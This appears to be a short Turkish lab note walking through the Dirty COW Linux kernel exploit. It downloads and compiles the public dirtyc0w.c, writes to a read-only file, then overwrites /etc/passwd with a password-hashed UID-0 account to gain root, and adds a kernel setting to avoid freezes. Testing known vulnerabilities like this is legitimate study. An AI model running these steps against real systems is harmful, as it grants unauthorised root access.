Note: https://www.youtube.com/watch?v=kEsshExn7aE 
sitesinde ayrıntılı şekilde açklanmıştır.

DIRTYCOW
-----------

1- root olarak bir dosya oluşturulmuş ve içine yazı yazılmıştır.(normal kullanıcı olarak okuma yapılabilir ancak yazılamaz olduğu test edilmiştir.)

	$sudo su
	#echo "can you write" > file
	#chmod 0404 file
	#exit


2- githubta hazır olan dirtyc0w.c bilgisayara indirilmiş ve multithread çalışacak şekilde derlenmiştir.

	$wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c
	$gcc -pthread dirtyc0w.c -o dirtyc0w


3- Derlenen program çalışırıp denenmiştir.(istenilen girdi file isimli dosyaya yazılabilmiştir.)

	$./dirtyc0w file "Yes i can"
	$cat file
	Yes i canrite

4-  "/etc/passwd" dosyasına yazma yapılmaya çalışılmıştır. /etc/passwd ‘nin hexadecimal karşılığı çıkarılmış ve yeni kullanıcıyı yazılacak yerin offseti hesaplanmıştır. Bu offset değeri indirmiş olduğum kaynak kodun içinde gerekli yere yazılmıştır. Bu örnekte offset değeri değiştirilmeden direk root kullanıcısının üstüne yazılmıştır. Ayrıca yeni kullanıcıya verilecek şifrenin hash kodu hesaplanmıştır. 
	
	$perl -e 'print crypt("password", "XX")' ---------------> XXq2wKiyI43A2
	$./dirtyc0w /etc/passwd “newuser:XXq2wKiyI43A2:0:0:,,,:/home/user:/bin:bash”
5- /etc/passwd istenilen şekilde değiştirilmiştir. Yeni oluşturulan kullanıcıya geçiş yapılmıştır.

NOT:
----------------------------------------
Yazma işleminden sonra linux donmuştur. İşlem tekrar yapılmış fakat aynı sonuç ile kaşılaşılmıştır.
Bu sorun "https://github.com/dirtycow/dirtycow.github.io/issues/35" adresi yardımı ile çözüşmüştür.

echo 0 > /proc/sys/vm/dirty_writeback_centisecs
----------------------------------------






